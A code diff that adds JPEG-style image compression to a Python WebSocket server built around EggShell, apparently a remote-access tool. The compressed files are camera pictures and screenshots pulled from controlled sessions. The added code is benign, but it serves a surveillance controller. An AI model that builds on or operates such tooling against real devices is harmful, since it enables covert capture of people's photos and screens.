@@ -10,6 +10,7 @@ import threading
 import json
 import time
 from eggshell import EggShell
+from PIL import Image
 
 
 class WsServer:
@@ -192,6 +193,12 @@ class WsServer:
         response["content"] = err_msg
         self.send_data(conn, json.dumps(response))
 
+    # Image Compression
+    def img_compression(self, filename, percent):
+        image_path = "DB/pictures/" + filename
+        image = Image.open(image_path)
+        image.save(image_path, optimize=True, quality=percent)
+
     # Execute command from clients' request
     def run_command(self, conn, content):
         response = {}
@@ -216,6 +223,7 @@ class WsServer:
         if action == 'picture':
             filename = self.eggshell.server.multihandler.interact(session_id, cmd_data)
             if filename:
+                self.img_compression(filename, 50)
                 response["status"] = "Success"
                 response["content_type"] = "text"
                 response["content"] = filename
@@ -225,6 +233,7 @@ class WsServer:
         elif action == 'screenshot':
             filename = self.eggshell.server.multihandler.interact(session_id, cmd_data)
             if filename:
+                self.img_compression(filename, 10)
                 response["status"] = "Success"
                 response["content_type"] = "text"
                 response["content"] = filename
